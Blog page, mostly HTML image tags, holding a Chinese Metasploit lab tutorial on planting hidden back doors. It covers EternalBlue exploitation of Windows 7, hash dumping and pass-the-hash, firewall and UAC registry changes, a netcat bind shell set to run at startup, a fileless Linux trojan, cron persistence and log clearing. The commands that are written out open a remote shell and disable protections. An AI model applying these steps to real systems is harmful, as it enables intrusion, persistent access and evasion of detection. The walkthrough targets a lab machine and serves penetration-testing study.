<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104924609.png" alt="image-20210820104924609"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820105003558.png" alt="image-20210820105003558"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908105946439.png" alt="image-20210908105946439"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820105313524.png" alt="image-20210820105313524"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820105655498.png" alt="image-20210820105655498"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20211008095108236.png" alt="image-20211008095108236"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/" class="post-title-link" itemprop="url">Mestasploit渗透测试之制作隐藏back door</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-19 20:54:06" itemprop="dateCreated datePublished" datetime="2021-08-19T20:54:06+08:00">2021-08-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-10-08 10:58:37" itemprop="dateModified" datetime="2021-10-08T10:58:37+08:00">2021-10-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Mestasploit渗透测试之制作隐藏back-door"><a href="#Mestasploit渗透测试之制作隐藏back-door" class="headerlink" title="Mestasploit渗透测试之制作隐藏back door"></a>Mestasploit渗透测试之制作隐藏back door</h1><h2 id="一、隐藏back-door的意义"><a href="#一、隐藏back-door的意义" class="headerlink" title="一、隐藏back door的意义"></a>一、隐藏back door的意义</h2><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819101229168.png" alt="image-20210819101229168"></p>
<h2 id="二、使用msf17-010永恒之蓝漏洞对win7进行渗透"><a href="#二、使用msf17-010永恒之蓝漏洞对win7进行渗透" class="headerlink" title="二、使用msf17-010永恒之蓝漏洞对win7进行渗透"></a>二、使用msf17-010永恒之蓝漏洞对win7进行渗透</h2><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819102221708.png" alt="image-20210819102221708"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819102252809.png" alt="image-20210819102252809"></p>
<p><strong>win7环境</strong></p>
<p>防火墙可以打开（使用家庭/工作网络）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819102146715.png" alt="image-20210819102146715"></p>
<p><strong>步骤1：</strong>渗透</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105253580.png" alt="image-20210819105253580"></p>
<p>加载、配置、启动模块</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105337567.png" alt="image-20210819105337567"></p>
<p>渗透成功</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105421575.png" alt="image-20210819105421575"></p>
<p><strong>步骤2：</strong>创建一个新用户远程连接win7桌面</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105618584.png" alt="image-20210819105618584"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105650319.png" alt="image-20210819105650319"></p>
<p>启动远程桌面</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105837404.png" alt="image-20210819105837404"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105910331.png" alt="image-20210819105910331"></p>
<p>输入密码后，若对方正在登录则会提升如下图。（对方也会有对应的提升，如果对方30s/一段时间没操作就会默认允许）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105942245.png" alt="image-20210819105942245"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819110057886.png" alt="image-20210819110057886"></p>
<p><strong>步骤3：</strong>关闭主机防护策略并开启back door</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819110454539.png" alt="image-20210819110454539"></p>
<p>这利用SAM，红色字段就是用哈斯算法加密的账号密码，前面是账号</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819110728859.png" alt="image-20210819110728859"></p>
<p>补充：kali（linux系统）进入window的shell后会有乱码，可以输入输入 chcp 65001</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819110958691.png" alt="image-20210819110958691"></p>
<p>指令：netsh firewall add portopening TCP 4444 “xuegod” ENABLE ALL</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111013939.png" alt="image-20210819111013939"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111056435.png" alt="image-20210819111056435"></p>
<p>指令：cmd.exe/k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111130454.png" alt="image-20210819111130454"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111235180.png" alt="image-20210819111235180"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111252073.png" alt="image-20210819111252073"></p>
<p>退出shell：Ctrl+c</p>
<p>指令：cmd.exe/k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v  LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</p>
<p><strong>步骤3：</strong>使用密码hash值登录系统</p>
<p>说明：1.红色字段是步骤2用hashdump查看到xuegod的密码哈斯值</p>
<p>2.SMBDomain值来自win7的工作组，如下图</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111937637.png" alt="image-20210819111937637"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111520715.png" alt="image-20210819111520715"></p>
<p>补充：如果失败了，多尝试几次（即使配置都正确，也不会100%成功）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112119208.png" alt="image-20210819112119208"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112142192.png" alt="image-20210819112142192"></p>
<p>说明：C:\windows\system32只是存放路径，可以放得隐藏些，但要记住（后面还要用）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112827492.png" alt="image-20210819112827492"></p>
<p>指令：reg setval -k HKLM\software\microsoft\windows\currentversion\run -v lltest_nc -d ‘C:\windows\nc.exe -Ldp 443 -e cmd.exe’</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112348784.png" alt="image-20210819112348784"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112412948.png" alt="image-20210819112412948"></p>
<p>也可以这样重启</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113147179.png" alt="image-20210819113147179"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113008314.png" alt="image-20210819113008314"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113051369.png" alt="image-20210819113051369"> </p>
<p>登录后程序才会运行，防火墙会弹出提示</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113307966.png" alt="image-20210819113307966"></p>
<p>程序已经在win7后台进行在监听</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113701382.png" alt="image-20210819113701382"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113549553.png" alt="image-20210819113549553"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113756461.png" alt="image-20210819113756461"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113805371.png" alt="image-20210819113805371"></p>
<h2 id="三、Linux无文件木马程序"><a href="#三、Linux无文件木马程序" class="headerlink" title="三、Linux无文件木马程序"></a>三、Linux无文件木马程序</h2><p><strong>环境</strong></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819155530456.png" alt="image-20210819155530456"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160114518.png" alt="image-20210819160114518"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160212702.png" alt="image-20210819160212702"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160235373.png" alt="image-20210819160235373"></p>
<p><strong>步骤1</strong>：监听</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160459633.png" alt="image-20210819160459633"></p>
<p>渗透</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160606476.png" alt="image-20210819160606476"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160633596.png" alt="image-20210819160633596"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160805424.png" alt="image-20210819160805424"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160847284.png" alt="image-20210819160847284"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160858685.png" alt="image-20210819160858685"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160951858.png" alt="image-20210819160951858"></p>
<p>渗透成功</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161050688.png" alt="image-20210819161050688"></p>
<p><strong>步骤2：</strong>到centos操作系统下载执行文件来建立session</p>
<p>（为了模拟实战隐藏行为效果，通过session进行操作）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161335768.png" alt="image-20210819161335768"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161825848.png" alt="image-20210819161825848"></p>
<p>补充：</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161537170.png" alt="image-20210819161537170"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161548062.png" alt="image-20210819161548062"></p>
<p>直接输入程序地址来执行</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161706964.png" alt="image-20210819161706964"></p>
<p>查看程序地址</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161734385.png" alt="image-20210819161734385"></p>
<p><strong>步骤3</strong>：创建无文件back door程序</p>
<p>配置监听4444端口（要新开个终端窗口）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819162015597.png" alt="image-20210819162015597"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819162602534.png" alt="image-20210819162602534"></p>
<p>（靶机终端效果展示）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819162708421.png" alt="image-20210819162708421"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819162825798.png" alt="image-20210819162825798"></p>
<p>说明：我们的木马文件必须放在vegile文件下</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163137866.png" alt="image-20210819163137866"></p>
<p>（靶机终端效果展示）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163209475.png" alt="image-20210819163209475"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163318186.png" alt="image-20210819163318186"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163454991.png" alt="image-20210819163454991"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163629607.png" alt="image-20210819163629607"></p>
<p>效果</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163806587.png" alt="image-20210819163806587"></p>
<p>补充：由于我们远程控制靶机下载了2个恶意文件，很容易暴露</p>
<p>我们可以删除2个文件，其还可以监听到</p>
<p>靶机端删除</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164122924.png" alt="image-20210819164122924"></p>
<p>攻击者端</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164347771.png" alt="image-20210819164347771"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164453141.png" alt="image-20210819164453141"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164501638.png" alt="image-20210819164501638"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164529645.png" alt="image-20210819164529645"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819201847720.png" alt="image-20210819201847720"></p>
<h2 id="四、使用脚本进行自动创建back-door"><a href="#四、使用脚本进行自动创建back-door" class="headerlink" title="四、使用脚本进行自动创建back door"></a>四、使用脚本进行自动创建back door</h2><p><strong>步骤1：</strong>配置脚本程序：</p>
<p>​    注意要如图所视目录操作；因为后面的下载路径是根据这里来的。（当然也可以该，要是要注意下载路径）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202050680.png" alt="image-20210819202050680"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202616448.png" alt="image-20210819202616448"></p>
<p>步骤2：渗透</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202658813.png" alt="image-20210819202658813"></p>
<p>（监听与上面实战例子的渗透模块一样，所以这里就不写操作了）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202433617.png" alt="image-20210819202433617"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202832845.png" alt="image-20210819202832845"></p>
<p>靶机执行脚本（这里只是为了展示，应该是有kali里执行比较好）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203051765.png" alt="image-20210819203051765"></p>
<p>kali查看监听结果</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203151702.png" alt="image-20210819203151702"></p>
<p>进入会话后</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203304121.png" alt="image-20210819203304121"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203339202.png" alt="image-20210819203339202"></p>
<p><strong>步骤3：</strong>让脚本自动运行</p>
<p>方法1：配置开机自启动</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203504865.png" alt="image-20210819203504865"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203920988.png" alt="image-20210819203920988"></p>
<p>方法2：配置系统级别的计划任务</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204117351.png" alt="image-20210819204117351"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204145273.png" alt="image-20210819204145273"></p>
<p>效果说明：靶机系统让脚本每小时启动一次</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204258879.png" alt="image-20210819204258879"></p>
<h2 id="五、清理系统日志"><a href="#五、清理系统日志" class="headerlink" title="五、清理系统日志"></a>五、清理系统日志</h2><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204504875.png" alt="image-20210819204504875"></p>
